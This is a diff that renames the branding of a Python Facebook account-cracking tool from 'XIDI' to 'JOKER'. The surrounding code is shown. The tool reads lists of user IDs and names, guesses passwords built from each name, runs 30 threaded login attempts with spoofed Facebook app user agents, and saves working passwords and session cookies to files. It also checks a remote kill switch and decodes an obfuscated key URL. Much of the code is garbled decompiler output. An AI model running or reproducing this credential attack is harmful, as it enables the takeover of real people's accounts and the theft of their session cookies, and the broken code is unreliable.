@@ -88,7 +88,7 @@ import random
 import sys
 import string
 import uuid
-from concurrent.futures import ThreadPoolExecutor as MrXIDI
+from concurrent.futures import ThreadPoolExecutor as MrJOKER
 from string import *
 from random import randint
 from time import sleep as slp
@@ -239,7 +239,7 @@ os.system('clear')
 xnx = requests.get('https://raw.githubusercontent.com/SKBER-CYBER/OGGY/main/On-off.txt').text
 if 'Oggytenance' in xnx:
     os.system('clear')
-    print(f'''{R}[{G1}✓{R}]{G1} XIDI TENANCE BREAK RUNNING\n''')
+    print(f'''{R}[{G1}✓{R}]{G1} JOKER TENANCE BREAK RUNNING\n''')
     sys.exit()
 if 'off' in xnx:
     print(f'''{R}[{G1}✓{R}]{G1} TOOL IS OFF NOW ''')
@@ -280,7 +280,7 @@ num_key = 'h'.join(K1 + K2)
 cm = num_key.encode('ASCII')
 cmr = base64.b64encode(cm)
 cm2 = str(cmr)
-kx = cm2.replace('b', 'XIDI')
+kx = cm2.replace('b', 'JOKER')
 key = kx.upper()
 url = base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01SLVhJREkvTVItWElESS1LRVkvbWFpbi9LZXkudHh0')
 main_url = url.decode('ASCII')
@@ -352,8 +352,8 @@ def expired_ck():
     for x in all_datA:
         if key in x:
             pass
-        XIDI = int(x.split("'|")[1])
-        if pure_data < XIDI:
+        JOKER = int(x.split("'|")[1])
+        if pure_data < JOKER:
             Main()
             return None
         None.system('clear')
@@ -414,7 +414,7 @@ def apv():
             None()
             return None
 
-sys.stdout.write('\x1b]2;<💚MR.XIDI💚>\x07')
+sys.stdout.write('\x1b]2;<💚MR.JOKER💚>\x07')
 
 def linex():
     print(f'''{Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
@@ -433,8 +433,8 @@ def fresh():
 def uaa():
     return '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/87.0.0.86.55;FBBV/38842789;FBDM/{density=2.4,width=720,height=1280};FBLC/ff_SN;FBCR/Wing Alpha;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J510F;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]'
 
-logo = []['\x1b[38;5;14m███    ███ ██████     ██   ██ ██ ██████  ██ \n████  ████ ██   ██     ██ ██  ██ ██   ██ ██ \n██ ████ ██ ██████       ███   ██ ██   ██ ██ \n██  ██  ██ ██   ██     ██ ██  ██ ██   ██ ██ \n██      ██ ██   ██ ██ ██   ██ ██ ██████  ██ \n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' AUTHOR    '][f'''{R}''']['>'][f'''{G1}'''][' XIDI-404         \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' YOUTUBE   '][f'''{R}''']['>'][f'''{G1}'''][' MR.XIDI                             \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' WHATSAPP  '][f'''{R}''']['>'][f'''{G1}'''][' +8801917466867                        \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' VERSION   '][f'''{R}''']['>'][f'''{Y}'''][' 1.1.3\n'][f'''{Y}''']([]['\x1b[38;5;14m███    ███ ██████     ██   ██ ██ ██████  ██ \n████  ████ ██   ██     ██ ██  ██ ██   ██ ██ \n██ ████ ██ ██████       ███   ██ ██   ██ ██ \n██  ██  ██ ██   ██     ██ ██  ██ ██   ██ ██ \n██      ██ ██   ██ ██ ██   ██ ██ ██████  ██ \n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' AUTHOR    '][f'''{R}''']['>'][f'''{G1}'''][' XIDI-404         \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' YOUTUBE   '][f'''{R}''']['>'][f'''{G1}'''][' MR.XIDI                             \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' WHATSAPP  '][f'''{R}''']['>'][f'''{G1}'''][' +8801917466867                        \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' VERSION   '][f'''{R}''']['>'][f'''{Y}'''][' 1.1.3\n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'])
-logo1 = []['\x1b[38;5;14m███    ███ ██████     ██   ██ ██ ██████  ██ \n████  ████ ██   ██     ██ ██  ██ ██   ██ ██ \n██ ████ ██ ██████       ███   ██ ██   ██ ██ \n██  ██  ██ ██   ██     ██ ██  ██ ██   ██ ██ \n██      ██ ██   ██ ██ ██   ██ ██ ██████  ██ \n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' Your Clonnig Started......\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][" Your CP ID's Saved : mrxidicp.txt\n"][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][" Your OK ID's Saved : mrxidiok.txt\n"][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}''']([]['\x1b[38;5;14m███    ███ ██████     ██   ██ ██ ██████  ██ \n████  ████ ██   ██     ██ ██  ██ ██   ██ ██ \n██ ████ ██ ██████       ███   ██ ██   ██ ██ \n██  ██  ██ ██   ██     ██ ██  ██ ██   ██ ██ \n██      ██ ██   ██ ██ ██   ██ ██ ██████  ██ \n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' Your Clonnig Started......\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][" Your CP ID's Saved : mrxidicp.txt\n"][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][" Your OK ID's Saved : mrxidiok.txt\n"][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' Your Clonnig Stop Press Ctrl Then z'])
+logo = []['\x1b[38;5;14m███    ███ ██████     ██   ██ ██ ██████  ██ \n████  ████ ██   ██     ██ ██  ██ ██   ██ ██ \n██ ████ ██ ██████       ███   ██ ██   ██ ██ \n██  ██  ██ ██   ██     ██ ██  ██ ██   ██ ██ \n██      ██ ██   ██ ██ ██   ██ ██ ██████  ██ \n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' AUTHOR    '][f'''{R}''']['>'][f'''{G1}'''][' JOKER-404         \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' YOUTUBE   '][f'''{R}''']['>'][f'''{G1}'''][' MR.JOKER                             \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' WHATSAPP  '][f'''{R}''']['>'][f'''{G1}'''][' +8801917466867                        \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' VERSION   '][f'''{R}''']['>'][f'''{Y}'''][' 1.1.3\n'][f'''{Y}''']([]['\x1b[38;5;14m███    ███ ██████     ██   ██ ██ ██████  ██ \n████  ████ ██   ██     ██ ██  ██ ██   ██ ██ \n██ ████ ██ ██████       ███   ██ ██   ██ ██ \n██  ██  ██ ██   ██     ██ ██  ██ ██   ██ ██ \n██      ██ ██   ██ ██ ██   ██ ██ ██████  ██ \n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' AUTHOR    '][f'''{R}''']['>'][f'''{G1}'''][' JOKER-404         \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' YOUTUBE   '][f'''{R}''']['>'][f'''{G1}'''][' MR.JOKER                             \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' WHATSAPP  '][f'''{R}''']['>'][f'''{G1}'''][' +8801917466867                        \n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' VERSION   '][f'''{R}''']['>'][f'''{Y}'''][' 1.1.3\n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'])
+logo1 = []['\x1b[38;5;14m███    ███ ██████     ██   ██ ██ ██████  ██ \n████  ████ ██   ██     ██ ██  ██ ██   ██ ██ \n██ ████ ██ ██████       ███   ██ ██   ██ ██ \n██  ██  ██ ██   ██     ██ ██  ██ ██   ██ ██ \n██      ██ ██   ██ ██ ██   ██ ██ ██████  ██ \n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' Your Clonnig Started......\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][" Your CP ID's Saved : mrJOKERcp.txt\n"][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][" Your OK ID's Saved : mrJOKERok.txt\n"][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}''']([]['\x1b[38;5;14m███    ███ ██████     ██   ██ ██ ██████  ██ \n████  ████ ██   ██     ██ ██  ██ ██   ██ ██ \n██ ████ ██ ██████       ███   ██ ██   ██ ██ \n██  ██  ██ ██   ██     ██ ██  ██ ██   ██ ██ \n██      ██ ██   ██ ██ ██   ██ ██ ██████  ██ \n'][f'''{Y}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' Your Clonnig Started......\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][" Your CP ID's Saved : mrJOKERcp.txt\n"][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][" Your OK ID's Saved : mrJOKERok.txt\n"][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' Your Clonnig Stop Press Ctrl Then z'])
 
 def Main():
     clear()
@@ -445,20 +445,20 @@ def Main():
     print(f'''{R}[{G1}5{R}]{G1} Join Facebook Group''')
     print(f'''{R}[{G1}6{R}]{G1} Close Program''')
     linex()
-    xidi = input(f'''{R}[{G1}✓{R}]{G1} Choose Option : ''')
-    if xidi == '1':
+    JOKER = input(f'''{R}[{G1}✓{R}]{G1} Choose Option : ''')
+    if JOKER == '1':
         method_crack()
-    if xidi == '2':
+    if JOKER == '2':
         Randm_Crack()
-    if xidi == '3':
+    if JOKER == '3':
         clear()
         print(f'''{R}[{G1}✓{R}]{G1} NEW UPDATE''')
-    if xidi == '4':
+    if JOKER == '4':
         clear()
         [][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' last123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' last@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first last\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast123@\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast@@\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast12345\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' First@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']']([][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' last123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' last@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first last\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast123@\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast@@\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast12345\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' First@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}''']([][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' last123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' last@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first last\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast123@\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast@@\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast12345\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' First@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first last']))
-    if xidi == '5':
+    if JOKER == '5':
         os.system('xdg-open https://facebook.com/groups/945647503604870/')
-    if xidi == '6':
+    if JOKER == '6':
         os.system('xdg-open https://facebook.com/groups/945647503604870/')
         return None
     return [][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' last123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' last@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' first last\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast123@\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast@@\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' firstlast12345\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}'''][']'][f'''{G1}'''][' First@123\n'][f'''{R}''']['['][f'''{G1}''']['✓'][f'''{R}''']
@@ -471,8 +471,8 @@ def method_crack():
     print(f'''{R}[{G1}3{R}]{G1} METHOD 3 ''')
     print(f'''{R}[{G1}4{R}]{G1} METHOD 4 ''')
     linex()
-    xidi_x = input(f'''{R}[{G1}✓{R}]{G1} INPUT {A}:{G1} ''')
-    if xidi_x == '1':
+    JOKER_x = input(f'''{R}[{G1}✓{R}]{G1} INPUT {A}:{G1} ''')
+    if JOKER_x == '1':
         methods.append('methodA')
         main_crack().crack(id)
         return None
@@ -504,7 +504,7 @@ class main_crack:
     
     def crack(self, id):
         clear()
-        print(f'''{R}[{G1}✓{R}]{G1} EX : /sdcard/XIDI.txt''')
+        print(f'''{R}[{G1}✓{R}]{G1} EX : /sdcard/JOKER.txt''')
         linex()
         self.file = input(f'''{R}[{G1}✓{R}]{G1} INPUT YOUR FILE {A}:{G1} ''')
         self.id = open(self.file).read().splitlines()
@@ -536,7 +536,7 @@ class main_crack:
             os.system('clear')
             print(logo1)
             linex()
-            XIDIworld = MrXIDI(max_workers = 30)
+            JOKERworld = MrJOKER(max_workers = 30)
             for zsb in self.id:
                 (uid, name) = zsb.split('|')
                 sz = name.split(' ')
@@ -544,13 +544,13 @@ class main_crack:
                     pwx = pw
                 pwx = pw
                 if 'methodA' in methods:
-                    XIDIworld.submit(self.methodA, uid, name, pwx)
+                    JOKERworld.submit(self.methodA, uid, name, pwx)
                 if 'methodB' in methods:
-                    XIDIworld.submit(self.methodB, uid, name, pwx)
+                    JOKERworld.submit(self.methodB, uid, name, pwx)
                 if 'methodC' in methods:
-                    XIDIworld.submit(self.methodC, uid, name, pwx)
+                    JOKERworld.submit(self.methodC, uid, name, pwx)
                 if 'methodD' in methods:
-                    XIDIworld.submit(self.methodD, uid, name, pwx)
+                    JOKERworld.submit(self.methodD, uid, name, pwx)
                 None(None, None)
                 if not None:
                     pass
@@ -559,7 +559,7 @@ class main_crack:
     
     def methodA(self, sid, name, psw):
         global loop
-        sys.stdout.write(f'''\r\r\r{A}[MR-XIDI] {len(self.id)}|{loop}|M1 {G1}{len(oks)}{A}|\x1b[1;30m{len(cps)}{A}|\x1b[1;36m0''')
+        sys.stdout.write(f'''\r\r\r{A}[MR-JOKER] {len(self.id)}|{loop}|M1 {G1}{len(oks)}{A}|\x1b[1;30m{len(cps)}{A}|\x1b[1;36m0''')
         sys.stdout.flush()
         fs = name.split(' ')[0]
         ls = name.split(' ')[1]
@@ -593,15 +593,15 @@ class main_crack:
 i['name'] + '=' + i['value']None)(q['session_cookies']())
                 Oggyb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                 cookie = f'''sb={Oggyb};{ckkk}'''
-                print(f'''\r\r{G1}[XIDI-OK] {sid}|{ps}|{ckkk}''')
+                print(f'''\r\r{G1}[JOKER-OK] {sid}|{ps}|{ckkk}''')
                 print('')
                 oks.append(sid)
-                open('/sdcard//XIDI/OK_ids_M1.txt', 'a').write(sid + '|' + ps + '\n')
-                open('/sdcard/XIDI/COOKiEs_M2.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
+                open('/sdcard//JOKER/OK_ids_M1.txt', 'a').write(sid + '|' + ps + '\n')
+                open('/sdcard/JOKER/COOKiEs_M2.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                 ';'.join
             if 'www.facebook.com' in q['error']['message']:
                 cps.append(sid)
-                open('/sdcard/XIDI/M1-CP.txt', 'a').write(sid + '|' + ps + '\n')
+                open('/sdcard/JOKER/M1-CP.txt', 'a').write(sid + '|' + ps + '\n')
             loop += 1
             return None
             if requests.exceptions.ConnectionError:
@@ -612,7 +612,7 @@ i['name'] + '=' + i['value']None)(q['session_cookies']())
     
     def methodB(self, sid, name, psw):
         global loop
-        sys.stdout.write(f'''\r\r\r{A}[MR-XIDI] {len(self.id)}|{loop}|M2 {G1}{len(oks)}{A}|\x1b[1;30m{len(cps)}{A}|\x1b[1;36m0''')
+        sys.stdout.write(f'''\r\r\r{A}[MR-JOKER] {len(self.id)}|{loop}|M2 {G1}{len(oks)}{A}|\x1b[1;30m{len(cps)}{A}|\x1b[1;36m0''')
         sys.stdout.flush()
         fs = name.split(' ')[0]
         ls = name.split(' ')[1]
@@ -646,15 +646,15 @@ i['name'] + '=' + i['value']None)(q['session_cookies']())
 i['name'] + '=' + i['value']None)(q['session_cookies']())
                 Oggyb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                 cookie = f'''sb={Oggyb};{ckkk}'''
-                print(f'''\r\r{G1}[XIDI-OK] {sid} | {ps}''')
+                print(f'''\r\r{G1}[JOKER-OK] {sid} | {ps}''')
                 oks.append(sid)
-                open('/sdcard//XIDI/OK_ids_M2.txt', 'a').write(sid + '|' + ps + '\n')
-                open('/sdcard/XIDI/COOKiEs_M2.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
+                open('/sdcard//JOKER/OK_ids_M2.txt', 'a').write(sid + '|' + ps + '\n')
+                open('/sdcard/JOKER/COOKiEs_M2.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                 ';'.join
             if 'www.facebook.com' in q['error']['message']:
-                print(f'''\r\x1b[1;30m[XIDI-CP] {sid} | {ps} {S}''')
+                print(f'''\r\x1b[1;30m[JOKER-CP] {sid} | {ps} {S}''')
                 cps.append(sid)
-                open('/sdcard/XIDI/M2-CP.txt', 'a').write(sid + '|' + ps + '\n')
+                open('/sdcard/JOKER/M2-CP.txt', 'a').write(sid + '|' + ps + '\n')
             loop += 1
             return None
             if requests.exceptions.ConnectionError:
@@ -665,7 +665,7 @@ i['name'] + '=' + i['value']None)(q['session_cookies']())
     
     def methodC(self, sid, name, psw):
         global loop
-        sys.stdout.write(f'''\r\r\r{A}[MR-XIDI] {len(self.id)}|{loop}|M3 {G1}{len(oks)}{A}|\x1b[1;30m{len(cps)}{A}|\x1b[1;36m0''')
+        sys.stdout.write(f'''\r\r\r{A}[MR-JOKER] {len(self.id)}|{loop}|M3 {G1}{len(oks)}{A}|\x1b[1;30m{len(cps)}{A}|\x1b[1;36m0''')
         sys.stdout.flush()
         fs = name.split(' ')[0]
         ls = name.split(' ')[1]
@@ -699,15 +699,15 @@ i['name'] + '=' + i['value']None)(q['session_cookies']())
 i['name'] + '=' + i['value']None)(q['session_cookies']())
                 Oggyb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                 cookie = f'''sb={Oggyb};{ckkk}'''
-                print(f'''\r\r{G1}[XIDI-OK] {sid} | {ps}''')
+                print(f'''\r\r{G1}[JOKER-OK] {sid} | {ps}''')
                 oks.append(sid)
-                open('/sdcard//XIDI/OK_ids_M3.txt', 'a').write(sid + '|' + ps + '\n')
-                open('/sdcard/XIDI/COOKiEs_M3.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
+                open('/sdcard//JOKER/OK_ids_M3.txt', 'a').write(sid + '|' + ps + '\n')
+                open('/sdcard/JOKER/COOKiEs_M3.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                 ';'.join
             if 'www.facebook.com' in q['error']['message']:
-                print(f'''\r\x1b[1;30m[XIDI-CP] {sid} | {ps} {S}''')
+                print(f'''\r\x1b[1;30m[JOKER-CP] {sid} | {ps} {S}''')
                 cps.append(sid)
-                open('/sdcard/XIDI/M3-CP.txt', 'a').write(sid + '|' + ps + '\n')
+                open('/sdcard/JOKER/M3-CP.txt', 'a').write(sid + '|' + ps + '\n')
             loop += 1
             return None
             if requests.exceptions.ConnectionError:
@@ -718,7 +718,7 @@ i['name'] + '=' + i['value']None)(q['session_cookies']())
     
     def methodD(self, sid, name, psw):
         global loop
-        sys.stdout.write(f'''\r\r\r{A}[MR-XIDI] {len(self.id)}|{loop}|M4 {G1}{len(oks)}{A}|\x1b[1;30m{len(cps)}{A}|\x1b[1;36m0''')
+        sys.stdout.write(f'''\r\r\r{A}[MR-JOKER] {len(self.id)}|{loop}|M4 {G1}{len(oks)}{A}|\x1b[1;30m{len(cps)}{A}|\x1b[1;36m0''')
         sys.stdout.flush()
         fs = name.split(' ')[0]
         ls = name.split(' ')[1]
@@ -752,15 +752,15 @@ i['name'] + '=' + i['value']None)(q['session_cookies']())
 i['name'] + '=' + i['value']None)(q['session_cookies']())
                 Oggyb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                 cookie = f'''sb={Oggyb};{ckkk}'''
-                print(f'''\r\r{G1}[XIDI-OK] {sid} | {ps}''')
+                print(f'''\r\r{G1}[JOKER-OK] {sid} | {ps}''')
                 oks.append(sid)
-                open('/sdcard//XIDI/OK_ids_M 4.txt', 'a').write(sid + '|' + ps + '\n')
-                open('/sdcard/XIDI/COOKiEs_M4.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
+                open('/sdcard//JOKER/OK_ids_M 4.txt', 'a').write(sid + '|' + ps + '\n')
+                open('/sdcard/JOKER/COOKiEs_M4.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                 ';'.join
             if 'www.facebook.com' in q['error']['message']:
-                print(f'''\r\x1b[1;30m[XIDI-CP] {sid} | {ps} {S}''')
+                print(f'''\r\x1b[1;30m[JOKER-CP] {sid} | {ps} {S}''')
                 cps.append(sid)
-                open('/sdcard/XIDI/M4-CP.txt', 'a').write(sid + '|' + ps + '\n')
+                open('/sdcard/JOKER/M4-CP.txt', 'a').write(sid + '|' + ps + '\n')
             loop += 1
             return None
             if requests.exceptions.ConnectionError:
